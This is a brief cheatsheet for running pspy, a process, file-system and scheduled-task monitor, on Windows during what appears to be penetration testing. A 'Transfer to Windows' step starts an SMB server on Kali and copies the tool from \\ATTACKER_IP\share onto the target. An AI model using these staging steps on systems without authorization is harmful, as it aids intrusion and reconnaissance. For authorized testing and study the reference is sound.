# pspy CHEATSHEET

## Quick Reference

### Basic Usage
```powershell
.\pspy64.exe
```

### Options
```powershell
--procs process1,process2    # Filter processes
--fs path                    # Monitor file system
--tasks                      # Monitor scheduled tasks
--task-filter "keyword"      # Filter tasks
--no-color                   # Disable colors
```

### Process Monitoring
```powershell
.\pspy64.exe --procs whoami,ipconfig,net.exe,net1.exe
.\pspy64.exe --procs powershell,cmd,certutil
```

### File System Monitoring
```powershell
.\pspy64.exe --fs C:\temp
.\pspy64.exe --fs C:\Users --fs C:\Scripts
```

### Task Monitoring
```powershell
.\pspy64.exe --tasks
.\pspy64.exe --tasks --task-filter "Backup"
```

### Transfer to Windows
```bash
# On Kali
impacket-smbserver share . -smb2support

# On Windows
copy \\ATTACKER_IP\share\pspy64.exe C:\temp\
```

---

## Target: Windows

```powershell
# Monitor for credential access
.\pspy64.exe --procs whoami,net.exe,net1.exe,systeminfo.exe

# Monitor file system
.\pspy64.exe --fs C:\temp
```
